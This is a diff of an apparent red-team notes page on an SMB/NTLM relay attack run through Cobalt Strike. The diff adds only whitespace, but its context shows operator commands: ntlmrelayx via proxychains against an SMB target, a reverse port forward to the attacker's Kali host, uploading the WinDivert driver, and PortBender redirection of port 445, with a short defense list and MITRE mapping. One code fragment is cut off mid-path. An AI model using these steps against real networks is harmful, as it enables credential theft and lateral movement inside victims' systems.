@@ -36,11 +36,15 @@ Technical Explanation: The attacker leverages Cobalt Strike to launch an SMB Rel
 
 Business Value: This technique is used by attackers to gain access to a target network and steal sensitive data. By using Cobalt Strike, attackers can evade detection and move laterally within the network, making it difficult for defenders to detect and stop the attack.
 
+ 
+
 ## Requirements
 
 1. Access to a victim’s computer
 
 1. Cobalt Strike
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ Business Value: This technique is used by attackers to gain access to a target n
 1. Use network segmentation to limit lateral movement
 
 1. Monitor network traffic for signs of suspicious activity
+
+ 
 
 ## Objectives
 
@@ -60,6 +66,8 @@ Business Value: This technique is used by attackers to gain access to a target n
 
 1. Move laterally within the network
 
+ 
+
 # Instructions
 
 1. This command is used to perform a SMB Relay Attack which allows an attacker to intercept and relay authentication requests from a victim to a target system. The attacker can then use the victim's credentials to gain access to the target system. The following commands are used:
@@ -69,10 +77,18 @@ Business Value: This technique is used by attackers to gain access to a target n
 4. upload C:\Tools\PortBender\WinDivert64.sys - This command uploads the WinDivert64.sys driver to the Beacon machine.
 5. PortBender redirect 445 8445 - This command redirects traffic from port 445 on the target system to port 8445 on the Beacon machine.
 
+ 
+
+
+
 **Code**: [[beacon> socks 1080
 kali> proxychains python3 /usr/]]
 
+
+
 > The SMB Relay Attack is a common technique used by attackers to gain access to a target system. The attacker intercepts authentication requests from a victim and relays them to the target system. The target system then responds with a challenge, which the attacker relays back to the victim. The victim responds with their credentials, which the attacker then uses to gain access to the target system. This technique is particularly effective against systems that use NTLM authentication, as it is vulnerable to relay attacks.
+
+
 
 **Command** ([[Proxychains ntlmrelayx.py to SMB target]]):
 
@@ -80,11 +96,19 @@ kali> proxychains python3 /usr/]]
 proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
 ```
 
+
+
+
+
 **Command** ([[Redirecting SMB traffic to local port]]):
 
 ```bash
 rportfwd_local 8445 <IP_KALI> 445
 ```
+
+
+
+
 
 **Command** ([[Uploading WinDivert64.sys]]):
 
@@ -92,11 +116,17 @@ rportfwd_local 8445 <IP_KALI> 445
 upload C:\Tools\PortBender\WinDivert64.sys
 ```
 
+
+
+
+
 **Command** ([[Redirecting SMB traffic to local port using PortBender]]):
 
 ```bash
 PortBender redirect 445 8445
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -119,3 +149,5 @@ PortBender redirect 445 8445
 
 - [[Cobalt Strike]]
 - [[NTLM Relaying via Cobalt Strike]]
+
+
